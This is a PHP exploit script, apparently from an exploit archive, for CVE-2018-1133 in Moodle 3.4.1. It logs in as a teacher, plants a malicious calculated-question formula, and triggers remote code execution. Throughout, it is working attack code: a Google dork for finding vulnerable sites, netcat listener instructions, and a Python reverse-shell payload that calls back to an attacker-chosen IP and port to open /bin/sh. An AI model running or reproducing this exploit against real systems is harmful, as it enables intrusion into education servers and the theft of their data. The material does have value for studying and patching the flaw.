<?php
/**
 * Exploit Title: Moodle v3.4.1 RCE Exploit
 * Google Dork: inurl:"/course/jumpto.php?jump="
 * Date: 15 March 2019
 * Exploit Author: Darryn Ten
 * Vendor Homepage: https://moodle.org
 * Software Link: https://github.com/moodle/moodle/archive/v3.4.1.zip
 * Version: 3.4.1 (Possibly < 3.5.0 and maybe even 3.x)
 * Tested on: Linux with Moodle v3.4.1
 * CVE : CVE-2018-1133
 *
 * This exploit is based on information provided by Robin Peraglie.
 * Additional Reading: https://blog.ripstech.com/2018/moodle-remote-code-execution
 *
 * A user with the teacher role is able to execute arbitrary code.
 *
 * Usage:
 *
 * >  php MoodleExploit.php url=http://example.com user=teacher pass=password ip=10.10.10.10 port=1010 course=1
 *
 * user       The account username
 * pass       The password to the account
 * ip         Callback IP
 * port       Callback Port
 * course     Valid course ID belonging to the teacher
 *
 * Make sure you're running a netcat listener on the specified port before
 * executing this script.
 *
 * > nc -lnvp 1010
 *
 * This will attempt to open up a reverse shell to the listening IP and port.
 *
 * You can start the script with `debug=true` to enable debug mode.
 */
namespace exploit {
    class moodle {
        public $ip;
        public $port;
        public $courseId;

        public $cookie_jar;
        public $url;
        public $pass;
        public $payload;
        public $quizId = false;

        public $moodleSession = false;
        public $moodleKey;

        // Verification patterns
        public $loginSuccessMatch = "/course.view\.php/";
        public $courseSuccessMatch = "/.\/i.Edit.settings.\/a./";
        public $editSuccessMatch = "/.view.php\?id=2&notifyeditingon=1/";
        public $quizSuccessMatch = "/.title.Editing.Quiz.\/title./";
        public $quizConfigMatch = "/title.*xxxx.\/title./";
        public $evilSuccess = "/The\ wild\ cards\ \<strong\>\{x..\}\<\/strong\>\ will\ be\ substituted/";

        public $debug;

        public function __construct($url, $user, $pass, $ip, $port, $course, $debug) {
            $this->cookie_jar = tempnam("/tmp","cookie");
            $this->url = $url;
            $this->pass = $pass;
            $this->ip = $ip;
            $this->port = $port;
            $this->courseId = $course;
            $this->debug = $debug;

            // Inject a reverse shell
            // You could modify this payload to inject whatever you like
            $this->payload = "(python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"".$this->ip."\",".$this->port."))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b')";

            echo("\n\r");
            echo("*------------------------------*\n\r");
            echo("* Noodle [Moodle RCE] (v3.4.1) *\n\r");
            echo("*------------------------------*\n\r");
            echo("\n\r");
            echo("[!] Make sure you have a listener\n\r");
            echo(sprintf("[!] at %s:%s\n\r", $this->ip, $this->port));
            echo("\n\r");

            $this->login($url, $user, $pass);
            $this->loadCourse($this->courseId);
            $this->enableEdit();
            $this->addQuiz();
            $this->editQuiz();
            $this->addCalculatedQuestion();
            $this->addEvilQuestion();
            $this->exploit();
            echo "[*] DONE\n\r";
            die();
        }

        function login($url, $user, $pass) {
            echo(sprintf("[*] Logging in as user %s with password %s \n\r", $user, $pass));

            $data = [
                "anchor" => "",
                "username" => $user,
                "password" => $pass
            ];

            $result = $this->httpPost("/login/index.php", $data);

            if (!preg_match($this->loginSuccessMatch, $result["body"])) {
                echo "[-] LOGIN FAILED!\n\r";
                echo "[?] Do you have the right credentials and url?\n\r";
                die();
            }

            $matches = [];
            $cookies = preg_match_all("/MoodleSession=(.*); path=/", $result["header"], $matches);

            $this->moodleSession = $matches[1][1];

            $matches = [];
            $key = preg_match_all("/sesskey\":\"(.*)\",\"themerev/", $result["body"], $matches);

            $this->moodleKey = $matches[1][0];

            echo "[+] Successful Login\n\r";
            echo sprintf("[>] Moodle Session %s \n\r", $this->moodleSession);
            echo sprintf("[>] Moodle Key %s \n\r", $this->moodleKey);
        }

        function loadCourse($id) {
            echo(sprintf("[*] Loading Course ID %s \n\r", $id));
            $result = $this->httpGet(sprintf("/course/view.php?id=%s", $id), $this->moodleSession);

            if (!preg_match($this->courseSuccessMatch, $result["body"])) {
                echo "[-] LOADING COURSE FAILED!\n\r";
                echo "[?] Does the course exist and belong to the teacher?\n\r";
                die();
            }

            echo "[+] Successfully Loaded Course\n\r";
        }

        function enableEdit() {
            echo(sprintf("[*] Enable Editing\n\r"));
            $result = $this->httpGet(sprintf(
                "/course/view.php?id=%s&sesskey=%s&edit=on",
                $this->courseId,
                $this->moodleKey
            ), $this->moodleSession);

            if (!preg_match($this->editSuccessMatch, $result["header"])) {
                echo "[-] ENABLE EDITING FAILED!\n\r";
                echo "[?] Does the user have the teacher role?\n\r";
                die();
            }

            echo "[+] Successfully Enabled Course Editing\n\r";
        }

        function addQuiz() {
            echo(sprintf("[*] Adding Quiz\n\r"));

            $data = [
                "course" => $this->courseId,
                "sesskey" => $this->moodleKey,
                "jump" => urlencode(sprintf(
                    "/course/mod.php?id=%s&sesskey=%s&str=0&add=quiz&section=0",
                    $this->courseId,
                    $this->moodleKey
                )),
            ];

            $result = $this->httpPost("/course/jumpto.php", $data, $this->moodleSession);

            if (!preg_match($this->quizSuccessMatch, $result["body"])) {
                echo "[-] ADD QUIZ FAILED!\n\r";
                die();
            }

            echo "[+] Successfully Added Quiz\n\r";
            echo "[*] Configuring New Quiz\n\r";

            $submit = [
                "grade" => 10,
                "boundary_repeats" => 1,
                "completionunlocked" => 1,
                "course" => $this->courseId,
                "coursemodule" => "",
                "section" => 0,
                "module" => 16,
                "modulename" => "quiz",
                "instance" => "",
                "add" => "quiz",
                "update" => 0,
                "return" => 0,
                "sr" => 0,
                "sesskey" => $this->moodleKey,
                "_qf__mod_quiz_mod_form" => 1,
                "mform_showmore_id_layouthdr" => 0,
                "mform_showmore_id_interactionhdr" => 0,
                "mform_showmore_id_display" => 0,
                "mform_showmore_id_security" => 0,
                "mform_isexpanded_id_general" => 1,
                "mform_isexpanded_id_timing" => 0,
                "mform_isexpanded_id_modstandardgrade" => 0,
                "mform_isexpanded_id_layouthdr" => 0,
                "mform_isexpanded_id_interactionhdr" => 0,
                "mform_isexpanded_id_reviewoptionshdr" => 0,
                "mform_isexpanded_id_display" => 0,
                "mform_isexpanded_id_security" => 0,
                "mform_isexpanded_id_overallfeedbackhdr" => 0,
                "mform_isexpanded_id_modstandardelshdr" => 0,
                "mform_isexpanded_id_availabilityconditionsheader" => 0,
                "mform_isexpanded_id_activitycompletionheader" => 0,
                "mform_isexpanded_id_tagshdr" => 0,
                "mform_isexpanded_id_competenciessection" => 0,
                "name" => "xxxx",
                "introeditor[text]" => "<p>xxxx<br></p>",
                "introeditor[format]" => 1,
                "introeditor[itemid]" => 966459952,
                "showdescription" => 0,
                "overduehandling" => "autosubmit",
                "gradecat" => 1,
                "gradepass" => "",
                "attempts" => 0,
                "grademethod" => 1,
                "questionsperpage" => 1,
                "navmethod" => "free",
                "shuffleanswers" => 1,
                "preferredbehaviour" => "deferredfeedback",
                "attemptonlast" => 0,
                "attemptimmediately" => 1,
                "correctnessimmediately" => 1,
                "marksimmediately" => 1,
                "specificfeedbackimmediately" => 1,
                "generalfeedbackimmediately" => 1,
                "rightanswerimmediately" => 1,
                "overallfeedbackimmediately" => 1,
                "attemptopen" => 1,
                "correctnessopen" => 1,
                "marksopen" => 1,
                "specificfeedbackopen" => 1,
                "generalfeedbackopen" => 1,
                "rightansweropen" => 1,
                "overallfeedbackopen" => 1,
                "showuserpicture" => 0,
                "decimalpoints" => 2,
                "questiondecimalpoints" => -1,
                "showblocks" => 0,
                "quizpassword" => "",
                "subnet" => "",
                "browsersecurity" => "-",
                "feedbacktext[0][text]" => "",
                "feedbacktext[0][format]" => 1,
                "feedbacktext[0][itemid]" => 754687559,
                "feedbackboundaries[0]" => "",
                "feedbacktext[1][text]" => "",
                "feedbacktext[1][format]" => 1,
                "feedbacktext[1][itemid]" => 88204176,
                "visible" => 1,
                "cmidnumber" => "",
                "groupmode" => 0,
                "availabilityconditionsjson" => urlencode("{\"op\":\"&\",\"c\":[],\"showc\":[]}"),
                "completion" => 1,
                "tags" => "_qf__force_multiselect_submission",
                "competency_rule" => 0,
                "submitbutton" => "Save and display"
            ];

            $result = $this->httpPost("/course/modedit.php", $submit, $this->moodleSession);

            if (!preg_match($this->quizConfigMatch, $result["body"])) {
                echo "[-] CONFIGURE QUIZ FAILED!\n\r";
                die();
            }

            $matches = [];
            $quiz = preg_match_all("/quiz\/view.php.id=(.*)&forceview=1/", $result["header"], $matches);

            $this->quizId = $matches[1][0];

            echo "[+] Successfully Configured Quiz\n\r";
        }

        function editQuiz() {
            echo(sprintf("[*] Loading Edit Quiz Page \n\r"));
            $result = $this->httpGet(sprintf("/mod/quiz/edit.php?cmid=%s", $this->quizId), $this->moodleSession);

            if (!preg_match("/.title.Editing quiz: xxxx.\/title/", $result["body"])) {
                echo "[-] LOADING EDITING PAGE FAILED!\n\r";
                die();
            }

            echo "[+] Successfully Loaded Edit Quiz Page\n\r";
        }

        function addCalculatedQuestion() {
            echo(sprintf("[*] Adding Calculated Question \n\r"));

            $endpoint = "/question/question.php?courseid=".$this->courseId."&sesskey=".$this->moodleKey."&qtype=calculated&returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D".$this->quizId."%26addonpage%3D0&cmid=".$this->quizId."&category=2&addonpage=0&appendqnumstring=addquestion'";

            $result = $this->httpGet($endpoint, $this->moodleSession);

            if (!preg_match("/title.Editing\ a\ Calculated\ question.\/title/", $result["body"])) {
                echo "[-] ADDING CALCULATED QUESTION FAILED!\n\r";
                die();
            }

            echo "[+] Successfully Added Calculation Question\n\r";
        }

        function addEvilQuestion() {
            echo(sprintf("[*] Adding Evil Question \n\r"));

            $payload = [
                "initialcategory" => 1,
                "reload" => 1,
                "shuffleanswers" => 1,
                "answernumbering" => "abc",
                "mform_isexpanded_id_answerhdr" => 1,
                "noanswers" => 1,
                "nounits" => 1,
                "numhints" => 2,
                "synchronize" => "",
                "wizard" => "datasetdefinitions",
                "id" => "",
                "inpopup" => 0,
                "cmid" => $this->quizId,
                "courseid" => 2,
                "returnurl" => sprintf("/mod/quiz/edit.php?cmid=%s&addonpage=0", $this->quizId),
                "scrollpos" => 0,
                "appendqnumstring" => "addquestion",
                "qtype" => "calculated",
                "makecopy" => 0,
                "sesskey" => $this->moodleKey,
                "_qf__qtype_calculated_edit_form" => 1,
                "mform_isexpanded_id_generalheader" => 1,
                "mform_isexpanded_id_unithandling" => 0,
                "mform_isexpanded_id_unithdr" => 0,
                "mform_isexpanded_id_multitriesheader" => 0,
                "mform_isexpanded_id_tagsheader" => 0,
                "category" => "2,23",
                "name" => "zzzz",
                "questiontext[text]" => "<p>zzzz<br></p>",
                "questiontext[format]" => 1,
                "questiontext[itemid]" => 999787569,
                "defaultmark" => 1,
                "generalfeedback[text]" => "",
                "generalfeedback[format]" => 1,
                "generalfeedback[itemid]" => 729029157,
                "answer[0]" => ' /*{a*/`$_GET[0]`;//{x}}',
                "fraction[0]" => "1.0",
                "tolerance[0]" => "0.01",
                "tolerancetype[0]" => 1,
                "correctanswerlength[0]" => 2,
                "correctanswerformat[0]" => 1,
                "feedback[0][text]" => "",
                "feedback[0][format]" => 1,
                "feedback[0][itemid]" => 928615051,
                "unitrole" => 3,
                "penalty" => "0.3333333",
                "hint[0]text]" => "",
                "hint[0]format]" => 1,
                "hint[0]itemid]" => 236679070,
                "hint[1]text]" => "",
                "hint[1]format]" => 1,
                "hint[1]itemid]" => 272691514,
                "tags" => "_qf__force_multiselect_submission",
                "submitbutton" => "Save change"
            ];

            $result = $this->httpPost("/question/question.php", $payload, $this->moodleSession);

            if (!preg_match($this->evilSuccess, $result["body"])) {
                echo "[-] EVIL QUESTION CREATION FAILED!\n\r";
                die();
            }

            echo "[+] Successfully Created Evil Question\n\r";
        }

        function exploit() {
            echo "[*] Sending Exploit\n\r";
            echo "\n\r";

            if ($this->debug) {
                echo "[D] Payload: \n\r";
                echo sprintf("[>] %s \n\r", $this->payload);
            }

            $exploitUrl = sprintf(
                "/question/question.php?returnurl=%s&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id=8&wizardnow=datasetitems&cmid=%s&0=(%s)",
                urlencode(sprintf(
                    "/mod/quiz/edit.php?cmid=%s",
                    $this->quizId)
                ),
                $this->quizId,
                $this->payload);

            if ($this->debug) {
                echo sprintf("[D] Exploit URL: %s \n\r", $exploitUrl);
            }

            echo sprintf("[>] You should receive a reverse shell attempt from the target at %s on port %s \n\r", $this->ip, $this->port);
            echo sprintf("[>] If connection was successful this program will wait here until you close the connection.\n\r");
            echo sprintf("[>] You should be able to Ctrl+C and retain the connection through netcat.\n\r");
            $this->httpGet($exploitUrl, $this->moodleSession);
        }

        function httpPost($url, $data, $session = false, $json = false)
        {
            if ($this->debug) {
                echo(sprintf("[D] Doing HTTP POST to URL: %s \n\r", $url));
                echo(sprintf("[D] Session: %s \n\r", $session));
                echo(sprintf("[D] Data: %s \n\r", json_encode($data)));
                echo("\n\r");
            }

            $curl = curl_init(sprintf("%s%s", $this->url, $url));

            $headers = [];

            if ($session) {
                array_push($headers, sprintf("Cookie: MoodleSession=%s", $session));
            }

            if ($json) {
                array_push($headers, "Content-Type: application/json");
            } else {
                $data =  urldecode(http_build_query($data));
            }

            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_HEADER, true);
            curl_setopt($curl, CURLOPT_COOKIEJAR, $this->cookie_jar);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            $response = curl_exec($curl);

            $header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
            $header = substr($response, 0, $header_size);
            $body = substr($response, $header_size);

            if ($this->debug) {
                echo "[D] Response Header";
                echo sprintf("[>] %s", $header);
                echo "";
                echo "[D] Response Body";
                echo sprintf("[>] %s", $body);
            }

            return [
                "header" => $header,
                "body" => $body
            ];
        }

        function httpGet($route, $session = false)
        {
            $url = sprintf("%s%s", $this->url, $route);

            if ($this->debug) {
                echo(sprintf("[D] Doing HTTP GET to URL: %s \n\r", $url));
                echo("\n\r");
            }

            $headers = [];

            if ($session) {
                array_push($headers, sprintf("Cookie: MoodleSession=%s", $session));
            }

            $curl = curl_init($url);

            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_HEADER, true);
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($curl, CURLOPT_COOKIEJAR, $this->cookie_jar);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            $response = curl_exec($curl);

            $header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
            $header = substr($response, 0, $header_size);
            $body = substr($response, $header_size);

            if ($this->debug) {
                echo "[D] Response Header";
                echo sprintf("[>] %s", $header);
                echo "";
                echo "[D] Response Body";
                echo sprintf("[>] %s", $body);
            }

            return [
                "header" => $header,
                "body" => $body
            ];
        }
    }

    parse_str(implode("&", array_slice($argv, 1)), $_GET);

    $url = $_GET["url"];
    $user = $_GET["user"];
    $pass = $_GET["pass"];
    $ip = $_GET["ip"];
    $port = $_GET["port"];
    $course = $_GET["course"];
    $debug = isset($_GET["debug"]) ? true : false;

    new \exploit\moodle($url, $user, $pass, $ip, $port, $course, $debug);
}